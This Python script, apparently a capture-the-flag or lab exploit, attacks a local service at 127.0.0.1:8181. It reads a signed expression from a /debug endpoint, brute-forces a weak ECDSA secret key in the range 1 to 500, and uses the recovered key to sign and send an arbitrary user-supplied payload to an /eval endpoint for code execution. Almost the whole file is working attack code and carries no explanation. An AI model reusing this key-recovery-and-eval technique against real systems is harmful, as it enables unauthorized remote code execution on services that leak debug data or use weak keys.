#!/usr/bin/env python3
# -*- encoding:utf-8 -*-

import json
import requests
import logging
import base64
import sys

import random
import binascii
from ecdsa import SigningKey, NIST384p

BASEHOST= "http://127.0.0.1:8181"

logger = logging.getLogger("default_log")
handler = logging.StreamHandler()
formatter = logging.Formatter("%(levelname)s | %(message)s")
handler.setFormatter(formatter)
logger.addHandler(handler)
logger.setLevel(logging.INFO)


def check_server():
    queryurl = BASEHOST
    logger.critical("Trying to check server status...")
    r = requests.get(queryurl)
    logger.info(r.json())


def get_dbg_info():
    queryurl = BASEHOST + "/debug"
    logger.critical("Getting Debug Info...")
    r = requests.get(queryurl)
    logger.debug(r.json())
    return r.json()


def send_exploit(exploit, rand):
    sk = SigningKey.from_secret_exponent(rand, curve=NIST384p)
    vk = sk.get_verifying_key()

    def sign(msg):
        return binascii.hexlify(sk.sign(msg))

    queryurl = BASEHOST + "/eval"
    finalexploit = base64.b64decode(exploit.encode())
    logger.critical("Sending exploit...")
    payload = {
        "expr": finalexploit.decode(),
        "sig": sign(finalexploit).decode()
    }
    r = requests.post(queryurl, json=payload)
    try:
        logger.info(r.json())
    except:
        logger.error("Error: Payload Error!")
        logger.error(r.text)


def printusage():
    print("Usage: " + sys.argv[0] + " <Base64-encoded Payload>")


def try_bf(orijson):
    def verify(vk, msg, sig):
        try:
            return vk.verify(binascii.unhexlify(sig), msg)
        except:
            return False

    logger.info("You have about 25% rate to get a correct rand.")
    oridt = orijson['response']['Expression'].encode()
    orisig = orijson['response']['Signature'].encode()
    FLAG = 0
    for i in range(1, 501):
        logger.info("Current Working on: RAND=" + str(i))
        rand = i
        sk = SigningKey.from_secret_exponent(rand, curve=NIST384p)
        vk = sk.get_verifying_key()
        success_not = verify(vk, oridt, orisig)
        if success_not:
            FLAG = 1
            logger.critical("Rand is: " + str(rand))
            return rand
    if FLAG == 0:
        print("You may reset the machine, rand is large than 500.")
        sys.exit(0)


def main():
    printusage()
    check_server()
    orid = get_dbg_info()
    rand = try_bf(orid)
    send_exploit(sys.argv[1], rand)


if __name__ == '__main__':
    try:
        if sys.argv[1]:
            pass
    except IndexError:
        print("Base64-encoded Payload Not Found.")
        sys.exit(1)
    main()
